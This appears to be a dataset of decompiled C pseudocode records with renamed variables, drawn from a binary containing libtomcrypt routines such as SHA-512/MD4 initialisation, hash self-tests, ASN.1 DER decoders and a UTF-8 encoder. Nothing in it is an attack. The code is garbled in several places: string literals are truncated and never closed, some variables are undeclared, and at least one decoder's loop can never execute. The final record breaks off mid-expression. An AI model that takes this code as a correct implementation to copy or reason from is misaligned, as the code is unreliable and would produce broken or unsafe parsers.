{"Function Name": "FUN_00412b90", "Address": "00412b90", "Source Code": "undefined8 FUN_00412b90(undefined8 *hash_values)\n{\n    \n    if (hash_values == (undefined8 *)0x0) {\n        \n        log_error(\"md != NULL\",\"libtomcrypt.c\",0x7725);\n    }\n    \n    *hash_values = 0;\n    \n    hash_values[1] = 0x6a09e667f3bcc908;\n    \n    hash_values[2] = 0xbb67ae8584caa73b;\n    \n    hash_values[3] = 0x3c6ef372fe94f82b;\n    \n    hash_values[4] = 0xa54ff53a5f1d36f1;\n    \n    hash_values[5] = 0x510e527fade682d1;\n    \n    hash_values[6] = 0x9b05688c2b3e6c1f;\n    \n    hash_values[7] = 0x1f83d9abfb41bd6b;\n    \n    hash_values[8] = 0x5be0cd19137e2179;\n    \n    hash_values[9] = 0;\n    \n    return 0;\n}"}
{"Function Name": "FUN_00412eb0", "Address": "00412eb0", "Source Code": "undefined4 FUN_00412eb0(void) \n{\n    char *string_pointer; \n    size_t string_length; \n    undefined *memory_pointer = &DAT_004388c8; \n    undefined temporary_data[64]; \n    do {\n        FUN_00412b90(local_128); \n        string_pointer = *(char **)(memory_pointer + -8); \n        string_length = strlen(string_pointer); \n        FUN_00412c40(local_128, string_pointer, string_length); \n        FUN_00412d70(local_128, temporary_data); \n        if (memcmp(temporary_data, memory_pointer, 0x40) != 0) { \n            return 5; \n        }\n        memory_pointer += 0x48; \n    } while (memory_pointer != &DAT_00438958); \n    \n    return 0; \n}"}
{"Function Name": "FUN_00412f30", "Address": "00412f30", "Source Code": "undefined8 FUN_00412f30(long input_pointer, undefined8 *output_pointer)\n{\n    \n    if (input_pointer == 0) {\n        FUN_00410bc0(\"md != NULL\", \"libtomcrypt.c\", 0x7629);\n    }\n    \n    if (output_pointer == (undefined8 *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x762a);\n    }\n    \n    if (0x7f < *(ulong *)(input_pointer + 0x48)) {\n        return 0x10;\n    }\n    \n    FUN_00412d70(input_pointer, output_pointer);\n    \n    return 0;\n}"}
{"Function Name": "FUN_00412ff0", "Address": "00412ff0", "Source Code": "undefined4 FUN_00412ff0(void) \n{\n    char *string_pointer; \n    size_t string_length; \n    undefined *memory_pointer = &DAT_00438968; \n    undefined temporary_data[48]; \n    do {\n        FUN_00412ae0(local_128); \n        string_pointer = *(char **)(memory_pointer + -8); \n        string_length = strlen(string_pointer); \n        FUN_00412c40(local_128, string_pointer, string_length); \n        FUN_00412f30(local_128, temporary_data); \n        if (memcmp(temporary_data, memory_pointer, 0x30) != 0) { \n            return 5; \n        }\n        memory_pointer += 0x38; \n    } while (memory_pointer != &DAT_004389d8); \n    \n    return 0; \n}"}
{"Function Name": "FUN_00413cf0", "Address": "00413cf0", "Source Code": "undefined8 FUN_00413cf0(int *key_size)\n{\n    \n    if (key_size == (int *)0x0) {\n        \n        FUN_00410bc0(\"keysize != NULL\",\"libtomcrypt.c\",0x7faa);\n    }\n    \n    \n    if (*key_size < 0x10) {\n        return 3; \n    }\n    \n    if (*key_size < 0x18) {\n        *key_size = 0x10; \n        return 0; \n    }\n    \n    if (*key_size > 0x1f) {\n        *key_size = 0x20; \n        return 0; \n    }\n    \n    *key_size = 0x18;\n    return 0; \n}"}
{"Function Name": "FUN_00413d60", "Address": "00413d60", "Source Code": "undefined8 FUN_00413d60(undefined8 *input_array)\n{\n    \n    if (input_array == (undefined8 *)0x0) {\n        \n        error_handler(\"md != NULL\",\"libtomcrypt.c\",0x85bf);\n    }\n    \n    *input_array = 0;\n    \n    *(undefined4 *)(input_array + 1) = 0x67452301;\n    \n    *(undefined4 *)(input_array + 2) = 0x98badcfe;\n    \n    *(undefined4 *)(input_array + 3) = 0x10325476;\n    \n    *(undefined4 *)((long)input_array + 0xc) = 0xefcdab89;\n    \n    *(undefined4 *)(input_array + 4) = 0;\n    \n    return 0;\n}"}
{"Function Name": "FUN_00414010", "Address": "00414010", "Source Code": "undefined4 FUN_00414010(void) \n{\n    size_t stringLength; \n    char *currentString = \"\"; \n    undefined *dataPointer = &DAT_00438728; \n    undefined temporaryData[16]; \n    undefined localBuffer[280]; \n    do {\n        FUN_00413d60(localBuffer); \n        stringLength = strlen(currentString); \n        FUN_00413dc0(localBuffer, currentString, stringLength); \n        FUN_00413ef0(localBuffer, temporaryData); \n        if (memcmp(temporaryData, dataPointer, 0x10) != 0) { \n            return 5; \n        }\n        currentString = *(char **)(dataPointer + 0x10); \n        dataPointer += 0x18; \n    } while (currentString != (char *)0x0); \n    \n    return 0; \n}"}
{"Function Name": "FUN_00414090", "Address": "00414090", "Source Code": "byte FUN_00414090(uint input_value) \n{\n    if (input_value > 0xff) { \n        return 10; \n    }\n    \n    return -(&data_array[(long)(int)input_value * 0x16] == 0) & 10; \n    \n    \n    \n    \n}"}
{"Function Name": "FUN_004141b0", "Address": "004141b0", "Source Code": "int FUN_004141b0(char input_char) \n{\n    char *data_pointer = &DAT_0065b5c8; \n    for (int index = 0; index < 0x100; index++) { \n        if (*data_pointer == input_char) { \n            \n            return (&DAT_0065b5c0)[index * 0x16] != 0 ? index : -1; \n        }\n        data_pointer += 0xb0; \n    }\n    return -1; \n}"}
{"Function Name": "FUN_00414310", "Address": "00414310", "Source Code": "int FUN_00414310(char input_char) \n{\n    char *data_pointer = &DAT_0064e5c8; \n    for (int index = 0; index < 0x100; index++) { \n        if (*data_pointer == input_char) { \n            \n            return (&DAT_0064e5c0)[index * 0x1a] != 0 ? index : -1; \n        }\n        data_pointer += 0xd0; \n    }\n    return -1; \n}"}
{"Function Name": "FUN_00414480", "Address": "00414480", "Source Code": "byte FUN_00414480(uint input_value) \n{\n    if (input_value > 0xff) { \n        return 0xb; \n    }\n    \n    return -(&DAT_0064e5c0[(long)input_value * 0x1a] == 0) & 0xb; \n}"}
{"Function Name": "FUN_004144b0", "Address": "004144b0", "Source Code": "byte FUN_004144b0(uint input_value)\n{\n    \n    if (input_value > 0xff) {\n        \n        return 0xc;\n    }\n    \n    return -(&data_array[input_value * 10] == 0) & 0xc;\n}"}
{"Function Name": "FUN_00414770", "Address": "00414770", "Source Code": "undefined8\nFUN_00414770(undefined8 *input_array, undefined8 first_param, undefined8 second_param, undefined8 third_param,\nundefined8 fourth_param, undefined8 fifth_param)\n{\n    long *long_pointer; \n    undefined8 return_value; \n    long temp_long; \n    long *local_stack_pointer = (long *)&stack0x00000008; \n    uint counter = 8; \n    long param_array[4] = {0, first_param, second_param, third_param}; \n    if (input_array != (undefined8 *)0x0) { \n        undefined8 *data_pointer = &DAT_00669900; \n        for (temp_long = 0x31; temp_long != 0; temp_long--) { \n            *data_pointer++ = *input_array++; \n        }\n    }\n    \n    while (true) { \n        if (counter < 0x30) { \n            long_pointer = (long *)((long)param_array + (ulong)counter); \n            counter += 8; \n        } else {\n            long_pointer = local_stack_pointer++; \n        }\n        if (*long_pointer == 0) break; \n        return_value = FUN_004144e0(); \n        if ((int)return_value != 0) { \n            return return_value; \n        }\n    }\n    \n    while (true) { \n        if (counter < 0x30) { \n            long_pointer = (long *)((long)param_array + (ulong)counter); \n            counter += 8; \n        } else {\n            long_pointer = local_stack_pointer++; \n        }\n        if (*long_pointer == 0) break; \n        return_value = FUN_004145a0(); \n        if ((int)return_value != 0) { \n            return return_value; \n        }\n    }\n    \n    while (true) { \n        if (counter < 0x30) { \n            temp_long = *(long *)((long)param_array + (ulong)counter); \n            counter += 8; \n        } else {\n            temp_long = *local_stack_pointer++; \n        }\n        if (temp_long == 0) break; \n        return_value = FUN_00414660(); \n        if ((int)return_value != 0) { \n            return return_value; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00414c70", "Address": "00414c70", "Source Code": "undefined8 FUN_00414c70(byte *input_buffer, ulong input_length, long output_buffer, ulong *output_length)\n{\n    byte second_byte; \n    undefined8 return_value = 7; \n    ulong combined_value; \n    ulong index; \n    \n    if (input_buffer == (byte *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x47c4); \n    }\n    \n    if (output_buffer == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x47c5); \n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x47c6); \n    }\n    \n    if ((1 < input_length) && ((*input_buffer & 0x1f) == 0x16)) {\n        second_byte = input_buffer[1]; \n        long max_length = 2; \n        combined_value = (ulong)second_byte; \n        \n        if ((char)second_byte < '\\0') {\n            combined_value = (ulong)(second_byte & 0x7f); \n            \n            if (2 < combined_value - 1 || input_length < combined_value + 1) {\n                return 7; \n            }\n            max_length = combined_value + 2; \n        }\n        \n        for (long loop_index = 2; loop_index < max_length; loop_index++) {\n            combined_value = (ulong)input_buffer[loop_index] | combined_value << 8; \n        }\n    }\n    \n    if (*output_length < combined_value) {\n        *output_length = combined_value; \n        return_value = 6; \n    } else if (combined_value + 2 <= input_length) { \n        index = 0; \n        \n        while (combined_value != index) {\n            long loop_index = 0; \n            \n            while ((uint)input_buffer[index + 2] != *(uint *)(&DAT_0043e284 + loop_index * 8)) {\n                loop_index++; \n                if (loop_index == 0x66) {\n                    return 0x10; \n                }\n            }\n            \n            if ((&DAT_0043e280)[(long)(int)loop_index * 2] == -1) {\n                return 0x10; \n            }\n            *(char *)(output_buffer + index) = (char)(&DAT_0043e280)[(long)(int)loop_index * 2]; \n            index++; \n        }\n        *output_length = index; \n        return_value = 0; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00414e20", "Address": "00414e20", "Source Code": "undefined8 FUN_00414e20(byte *input_bytes, ulong length, long num_ptr)\n{\n    ulong calculated_length, index, accumulated_value; \n    byte second_byte; \n    code *function_pointer; \n    int function_result; \n    undefined4 temp_value; \n    undefined8 result; \n    ulong byte_index; \n    \n    if (num_ptr == 0) {\n        FUN_00410bc0(\"num != NULL\", \"libtomcrypt.c\", 0x4822);\n    }\n    \n    if (input_bytes == (byte *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4823);\n    }\n    \n    if (length < 3) {\n        return 7;\n    }\n    \n    if ((*input_bytes & 0x1f) != 2) {\n        return 7;\n    }\n    second_byte = input_bytes[1]; \n    \n    if ((char)second_byte < '\\0') {\n        calculated_length = (ulong)(second_byte & 0x7f) + 2; \n        \n        if (length < calculated_length) {\n            return 7;\n        }\n        \n        if (3 < (ulong)(second_byte & 0x7f) - 1) {\n            return 7;\n        }\n        accumulated_value = 0; \n        byte_index = 2; \n        \n        do {\n            index = byte_index + 1; \n            accumulated_value = (ulong)input_bytes[byte_index] | accumulated_value << 8; \n            byte_index = index; \n        } while (calculated_length != index); \n        \n        if (length < calculated_length + accumulated_value) {\n            return 7;\n        }\n        input_bytes += calculated_length; \n    } else {\n        input_bytes += 2; \n        \n        if (length < (ulong)second_byte + 2) {\n            return 7;\n        }\n    }\n    \n    result = (*DAT_006699a0)(num_ptr, input_bytes);\n    \n    if (((int)result == 0) && (result = 0, (char)*input_bytes < '\\0')) {\n        function_result = (*DAT_00669910)(&local_20); \n        function_pointer = DAT_00669978; \n        \n        if (function_result == 0) {\n            temp_value = (*DAT_00669968)(num_ptr); \n            function_result = (*function_pointer)(local_20, temp_value); \n            \n            if ((function_result == 0) && (function_result = (*DAT_006699b8)(num_ptr, local_20, num_ptr), function_result == 0)) {\n                (*DAT_00669920)(local_20); \n                return 0; \n            }\n            (*DAT_00669920)(local_20); \n        }\n        result = 0xd; \n    }\n    return result; \n}"}
{"Function Name": "FUN_00414fb0", "Address": "00414fb0", "Source Code": "undefined8 FUN_00414fb0(byte *input_bytes, ulong input_length, ulong *output_words, ulong *output_length)\n{\n    byte second_byte; \n    undefined8 return_value = 7; \n    ulong word_count = 0, current_value = 0, byte_count = 0, index = 0; \n    long temp_var1, temp_var2, calculated_value = 2; \n    \n    if (input_bytes == (byte *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x488f); \n    }\n    \n    if (output_words == (ulong *)0x0) {\n        FUN_00410bc0(\"words != NULL\", \"libtomcrypt.c\", 0x4890); \n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x4891); \n    }\n    \n    if (2 < input_length && 1 < *output_length && (*input_bytes & 0x1f) == 6) {\n        second_byte = input_bytes[1]; \n        \n        if ((char)second_byte < '\\0') {\n            \n            if (1 < (byte)(second_byte + 0x7f) || (second_byte & 0x7f) == 0) {\n                return 7; \n            }\n            calculated_value = (ulong)(second_byte & 0x7f) + 2; \n        }\n        \n        if (byte_count != 0 && calculated_value + byte_count <= input_length) {\n            do {\n                \n                current_value = (ulong)(input_bytes[index + calculated_value] & 0x7f) | current_value << 7;\n                \n                if (-1 < (char)input_bytes[index + calculated_value]) {\n                    \n                    if (*output_length <= word_count) {\n                        return 6; \n                    }\n                    \n                    if (word_count == 0) {\n                        *output_words = current_value / 0x28; \n                        word_count = 2; \n                        output_words[1] = current_value % 0x28; \n                        current_value = 0; \n                    } else {\n                        output_words[word_count] = current_value; \n                        word_count++; \n                        current_value = 0; \n                    }\n                }\n                index++; \n            } while (byte_count != index); \n            *output_length = word_count; \n            return_value = 0; \n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00415180", "Address": "00415180", "Source Code": "undefined8 FUN_00415180(byte *input_buffer, ulong buffer_length, long output_pointer, ulong *output_length)\n{\n    byte second_byte; \n    undefined8 return_value = 7; \n    ulong combined_value = 0; \n    long length = 2; \n    \n    if (input_buffer == (byte *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x48f4); \n    }\n    \n    if (output_pointer == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x48f5); \n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x48f6); \n    }\n    \n    if ((1 < buffer_length) && ((*input_buffer & 0x1f) == 4)) {\n        second_byte = input_buffer[1]; \n        \n        if ((char)second_byte < '\\0') {\n            combined_value = (ulong)(second_byte & 0x7f); \n            \n            if (2 < combined_value - 1 || buffer_length < combined_value + 1) {\n                return 7; \n            }\n            length = combined_value + 2; \n        } else {\n            length = 2; \n        }\n        \n        for (long index = 2; index < length; index++) {\n            combined_value = (ulong)input_buffer[index] | combined_value << 8; \n        }\n    }\n    \n    if (*output_length < combined_value) {\n        *output_length = combined_value; \n        return_value = 6; \n    } else if (combined_value + length <= buffer_length) { \n        if (combined_value != 0) { \n            \n            for (ulong copy_index = 0; copy_index < combined_value; copy_index++) {\n                *(byte *)(output_pointer + copy_index) = input_buffer[copy_index + length]; \n            }\n        }\n        *output_length = combined_value; \n        return_value = 0; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_004152f0", "Address": "004152f0", "Source Code": "undefined8 FUN_004152f0(byte *input_buffer, ulong input_length, long output_buffer, ulong *output_length)\n{\n    byte second_byte; \n    undefined8 return_value = 7; \n    ulong calculated_length = 0; \n    ulong output_index; \n    \n    if (input_buffer == (byte *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4950); \n    }\n    \n    if (output_buffer == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4951); \n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x4952); \n    }\n    \n    if ((1 < input_length) && ((*input_buffer & 0x1f) == 0x13)) {\n        second_byte = input_buffer[1]; \n        long length_variable = 2; \n        \n        if ((char)second_byte < '\\0') {\n            calculated_length = (ulong)(second_byte & 0x7f); \n            \n            if (2 < calculated_length - 1 || input_length < calculated_length + 1) {\n                return 7; \n            }\n            length_variable = calculated_length + 2; \n        }\n        \n        for (long character_index = 2; character_index < length_variable; character_index++) {\n            calculated_length = (ulong)input_buffer[character_index] | calculated_length << 8; \n        }\n    }\n    \n    if (*output_length < calculated_length) {\n        *output_length = calculated_length; \n        return_value = 6; \n    } else if (calculated_length + 2 <= input_length) { \n        output_index = 0; \n        if (calculated_length != 0) { \n            do {\n                long character_index = 0; \n                \n                while ((uint)input_buffer[output_index + 2] != L\"  \\'\\'(())++,,--..\n                    character_index++; \n                    if (character_index == 0x4a) {\n                        return 0x10; \n                    }\n                }\n                \n                if (L\"  \\'\\'(())++,,--..\n                    return 0x10; \n                }\n                \n                *(char *)(output_buffer + output_index) = (char)L\"  \\'\\'(())++,,--..\n                output_index++; \n            } while (calculated_length != output_index); \n        }\n        *output_length = output_index; \n        return_value = 0; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00415560", "Address": "00415560", "Source Code": "undefined8 FUN_00415560(long inputPointer, ulong *inputLength, uint *outputArray)\n{\n    long tempLong; \n    ulong inputByte, calculatedLength, index; \n    char localChars[4]; \n    char char5, char6, char7, char8, char9, char10, char11, char12, char13, char14, char15, char16, char17; \n    \n    if (inputPointer == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4d66);\n    }\n    \n    if (inputLength == (ulong *)0x0) {\n        FUN_00410bc0(\"inlen != NULL\", \"libtomcrypt.c\", 0x4d67);\n    }\n    \n    if (outputArray == (uint *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4d68);\n    }\n    \n    if (((1 < *inputLength) && (inputByte = (ulong)*(byte *)(inputPointer + 1), *(byte *)(inputPointer + 1) < 0x20)) &&\n        (calculatedLength = inputByte + 2, calculatedLength <= *inputLength)) {\n        \n        if (inputByte == 0) {\n            calculatedLength = 2;\n        } else {\n            index = 0; \n            do {\n                tempLong = 0; \n                \n                while ((uint)*(byte *)(inputPointer + 2 + index) != *(uint *)(&DAT_0043e284 + tempLong * 8)) {\n                    tempLong++; \n                    \n                    if (tempLong == 0x66) {\n                        return 7;\n                    }\n                }\n                \n                if ((&DAT_0043e280)[(long)(int)tempLong * 2] == -1) {\n                    return 7;\n                }\n                \n                localChars[index] = (char)(&DAT_0043e280)[(long)(int)tempLong * 2];\n                index++; \n            } while (inputByte != index); \n        }\n    }\n    *inputLength = calculatedLength; \n    int sum1 = 1000; \n    int sum2 = 100; \n    \n    if ((byte)(localChars[0] - 0x30U) < 10) {\n        \n        sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(localChars[0] - 0x30U) * 4) * 10;\n    }\n    \n    if ((byte)(localChars[1] - 0x30U) < 10) {\n        \n        sum2 = *(int *)(&DAT_004386e0 + (ulong)(byte)(localChars[1] - 0x30U) * 4);\n    }\n    *outputArray = sum1 + sum2; \n    \n    if ((uint)(sum1 + sum2) < 100) {\n        sum1 = 1000; \n        \n        if ((byte)(localChars[2] - 0x30U) < 10) {\n            \n            sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(localChars[2] - 0x30U) * 4) * 10;\n        }\n        \n        if ((byte)(localChars[3] - 0x30U) < 10) {\n            \n            sum2 = *(int *)(&DAT_004386e0 + (ulong)(byte)(localChars[3] - 0x30U) * 4);\n        }\n        outputArray[1] = sum1 + sum2; \n        \n        if ((uint)(sum1 + sum2) < 0xd) {\n            sum1 = 1000; \n            \n            if ((byte)(char5 - 0x30U) < 10) {\n                \n                sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char5 - 0x30U) * 4) * 10;\n            }\n            \n            if ((byte)(char6 - 0x30U) < 10) {\n                \n                sum2 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char6 - 0x30U) * 4);\n            }\n            outputArray[2] = sum1 + sum2; \n            \n            if ((uint)(sum1 + sum2) < 0x20) {\n                sum1 = 1000; \n                \n                if ((byte)(char7 - 0x30U) < 10) {\n                    \n                    sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char7 - 0x30U) * 4) * 10;\n                }\n                \n                if ((byte)(char8 - 0x30U) < 10) {\n                    \n                    sum2 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char8 - 0x30U) * 4);\n                }\n                outputArray[3] = sum1 + sum2; \n                \n                if ((uint)(sum1 + sum2) < 0x18) {\n                    sum1 = 1000; \n                    \n                    if ((byte)(char9 - 0x30U) < 10) {\n                        \n                        sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char9 - 0x30U) * 4) * 10;\n                    }\n                    \n                    if ((byte)(char10 - 0x30U) < 10) {\n                        \n                        sum2 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char10 - 0x30U) * 4);\n                    }\n                    outputArray[4] = sum1 + sum2; \n                    \n                    if ((uint)(sum1 + sum2) < 0x3c) {\n                        outputArray[5] = 0; \n                        outputArray[6] = 0; \n                        outputArray[7] = 0; \n                        outputArray[8] = 0; \n                        \n                        if (char11 != 'Z') {\n                            \n                            if ((char11 == '-') || (char11 == '+')) {\n                                outputArray[6] = (uint)(char11 != '+'); \n                                sum1 = 1000; \n                                \n                                if ((byte)(char12 - 0x30U) < 10) {\n                                    \n                                    sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char12 - 0x30U) * 4) * 10;\n                                }\n                                \n                                if ((byte)(char13 - 0x30U) < 10) {\n                                    \n                                    sum2 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char13 - 0x30U) * 4);\n                                }\n                                outputArray[7] = sum1 + sum2; \n                                \n                                if (0x17 < (uint)(sum1 + sum2)) {\n                                    return 7;\n                                }\n                                sum1 = 1000; \n                                \n                                if ((byte)(char14 - 0x30U) < 10) {\n                                    \n                                    sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char14 - 0x30U) * 4) * 10;\n                                }\n                            }\n                            else {\n                                sum1 = 1000; \n                                \n                                if ((byte)(char11 - 0x30U) < 10) {\n                                    \n                                    sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char11 - 0x30U) * 4) * 10;\n                                }\n                                \n                                if ((byte)(char12 - 0x30U) < 10) {\n                                    \n                                    sum2 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char12 - 0x30U) * 4);\n                                }\n                                outputArray[5] = sum2 + sum1; \n                                \n                                if (0x3b < (uint)(sum2 + sum1)) {\n                                    return 7;\n                                }\n                                \n                                if (char13 == 'Z') {\n                                    return 0; \n                                }\n                                \n                                if ((char13 != '-') && (char13 != '+')) {\n                                    return 7; \n                                }\n                                outputArray[6] = (uint)(char13 != '+'); \n                                sum1 = 1000; \n                                \n                                if ((byte)(char14 - 0x30U) < 10) {\n                                    \n                                    sum1 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char14 - 0x30U) * 4) * 10;\n                                }\n                            }\n                            \n                            if ((byte)(char15 - 0x30U) < 10) {\n                                \n                                sum2 = *(int *)(&DAT_004386e0 + (ulong)(byte)(char15 - 0x30U) * 4);\n                            }\n                            outputArray[8] = sum1 + sum2; \n                            \n                            if (0x3b < (uint)(sum1 + sum2)) {\n                                return 7;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00415ca0", "Address": "00415ca0", "Source Code": "undefined8 FUN_00415ca0(uint *inputArray,long elementCount,undefined *outputBuffer,ulong *outputLength)\n{\n    long currentIndex; \n    ulong finalOutputLength; \n    uint currentValue; \n    ulong totalLength; \n    \n    if (inputArray == (uint *)0x0) {\n        FUN_00410bc0(\"in != NULL\",\"libtomcrypt.c\",0x546b);\n    }\n    \n    if (outputBuffer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x546c);\n    }\n    \n    if (outputLength == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x546d);\n    }\n    \n    if (elementCount != 0) {\n        currentValue = *inputArray; \n        \n        if (currentValue < 0x20000) {\n            totalLength = 0; \n            currentIndex = 0; \n            do {\n                \n                long lengthForCurrentValue = (0x7f < (int)currentValue) ? ((0x7ff < (int)currentValue) ? ((0xffff < (int)currentValue) + 3) : 2) : 1);\n                totalLength += lengthForCurrentValue; \n                \n                if (currentIndex + 1 == elementCount) {\n                    \n                    finalOutputLength = (totalLength + ((0x7f < totalLength) ? ((0xff < totalLength) ? ((0xffff < totalLength) ? ((0xffffff < totalLength) ? 0x10 : totalLength + 5) : totalLength + 4) : totalLength + 3) : totalLength + 2) : 2));\n                    goto LAB_00415d90; \n                }\n                currentIndex++; \n                currentValue = inputArray[currentIndex]; \n            } while (currentValue < 0x20000); \n        }\n        return 0x10; \n    }\n    finalOutputLength = 2; \n    totalLength = 0; \nLAB_00415d90:\n    \n    if (*outputLength < finalOutputLength) {\n        *outputLength = totalLength; \n        return 6; \n    }\n    *outputBuffer = 0xc; \n    \n    if (totalLength < 0x80) {\n        outputBuffer[1] = (undefined)totalLength; \n        finalOutputLength = 2; \n    } else if (totalLength < 0x100) {\n        outputBuffer[1] = 0x81; \n        outputBuffer[2] = (undefined)totalLength; \n        finalOutputLength = 3; \n    } else {\n        undefined highByte = (undefined)(totalLength >> 8); \n        if (totalLength < 0x10000) {\n            outputBuffer[1] = 0x82; \n            outputBuffer[2] = highByte; \n            outputBuffer[3] = (undefined)totalLength; \n            finalOutputLength = 4; \n        } else {\n            \n            if (0xffffff < totalLength) {\n                return 0x10; \n            }\n            outputBuffer[1] = 0x83; \n            outputBuffer[2] = (char)(totalLength >> 0x10); \n            outputBuffer[3] = highByte; \n            outputBuffer[4] = (undefined)totalLength; \n            finalOutputLength = 5; \n        }\n    }\n    uint *iterator = inputArray; \n    \n    if (elementCount != 0) {\n        do {\n            currentValue = *iterator; \n            \n            if ((int)currentValue < 0x80) {\n                outputBuffer[finalOutputLength++] = (char)currentValue; \n            } else {\n                \n                if ((int)currentValue < 0x800) {\n                    outputBuffer[finalOutputLength++] = (byte)((int)currentValue >> 6) | 0xc0; \n                    outputBuffer[finalOutputLength++] = *(byte *)iterator & 0x3f | 0x80; \n                } else if ((int)currentValue < 0x10000) {\n                    outputBuffer[finalOutputLength++] = (byte)((int)currentValue >> 0xc) | 0xe0; \n                    outputBuffer[finalOutputLength++] = (byte)((int)*iterator >> 6) & 0x3f | 0x80; \n                    outputBuffer[finalOutputLength++] = *(byte *)iterator & 0x3f | 0x80; \n                } else {\n                    outputBuffer[finalOutputLength++] = (byte)((int)currentValue >> 0x12) & 7 | 0xf0; \n                    outputBuffer[finalOutputLength++] = (byte)((int)*iterator >> 0xc) & 0x3f | 0x80; \n                    outputBuffer[finalOutputLength++] = (byte)((int)*iterator >> 6) & 0x3f | 0x80; \n                }\n            }\n            iterator++; \n        } while (iterator != inputArray + elementCount); \n    }\n    *outputLength = finalOutputLength; \n    return 0; \n}"}
{"Function Name": "FUN_00416270", "Address": "00416270", "Source Code": "undefined8 FUN_00416270(undefined8 *input_pointer)\n{\n    \n    if (input_pointer != (undefined8 *)0x0) {\n        \n        *input_pointer = 3;\n    } else {\n        \n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x5516);\n    }\n    \n    global_variable = 3;\n    \n    return 0;\n}"}
{"Function Name": "FUN_004162b0", "Address": "004162b0", "Source Code": "undefined4 FUN_004162b0(int input_value) \n{\n    for (long index = 0; index != 0x66; index++) { \n        if ((&data_array)[index * 2] == input_value) { \n            return *(undefined4 *)(&result_array + index * 8); \n        }\n    }\n    return 0xffffffff; \n}"}
{"Function Name": "FUN_004162f0", "Address": "004162f0", "Source Code": "undefined4 FUN_004162f0(int input_value)\n{\n    \n    for (long iteration_index = 0; iteration_index < 0x66; iteration_index++) {\n        \n        if (*(int *)(&base_address + iteration_index * 8) == input_value) {\n            \n            return (&value_array)[iteration_index * 2];\n        }\n    }\n    \n    return 0xffffffff;\n}"}
{"Function Name": "FUN_00416ac0", "Address": "00416ac0", "Source Code": "long FUN_00416ac0(uint input_value)\n{\n    ulong bit_counter = (ulong)input_value; \n    long bit_count = 0; \n    while (bit_counter != 0) { \n        bit_count++; \n        bit_counter >>= 1; \n    }\n    return bit_count; \n}"}
{"Function Name": "FUN_004171a0", "Address": "004171a0", "Source Code": "wchar_t find_next_char(wchar_t input_char)\n{\n    \n    for (long index = 0; index < 0x4a; index++) {\n        \n        if (L\"  \\'\\'(())++,,--..\n        [index * 2] == input_char) {\n            \n            return L\"  \\'\\'(())++,,--..\n            [index * 2 + 1];\n        }\n    }\n    \n    return L'\\xffffffff';\n}"}
{"Function Name": "FUN_004171e0", "Address": "004171e0", "Source Code": "wchar_t FUN_004171e0(wchar_t input_char) \n{\n    for (long index = 0; index < 0x4a; index++) { \n        \n        if (L\"  \\'\\'(())++,,--..\n        [index * 2 + 1] == input_char) {\n            \n            return L\"  \\'\\'(())++,,--..\n            [index * 2];\n        }\n    }\n    \n    return L'\\xffffffff'; \n}"}
{"Function Name": "FUN_00417580", "Address": "00417580", "Source Code": "undefined8 FUN_00417580(uint inputValue, undefined *outputPointer, ulong *outputLengthPointer)\n{\n    undefined8 returnValue; \n    ulong intermediateValue;      \n    ulong outputByteCounter;      \n    ulong outputSize;      \n    ulong loopCounter;      \n    long loopIndex;       \n    \n    if (outputPointer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x53b6); \n    }\n    \n    if (outputLengthPointer == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x53b7); \n    }\n    \n    \n    returnValue = FUN_004174f0(inputValue, &intermediateValue);\n    \n    if ((int)returnValue != 0) {\n        return returnValue; \n    }\n    \n    if (*outputLengthPointer < intermediateValue) {\n        *outputLengthPointer = intermediateValue; \n        return 6; \n    }\n    \n    loopIndex = 0; \n    intermediateValue = inputValue; \n    \n    if (inputValue == 0) {\n        intermediateValue = 1; \n        if (-intermediateValue != -4) { \n            \n            for (loopIndex = 1; inputValue 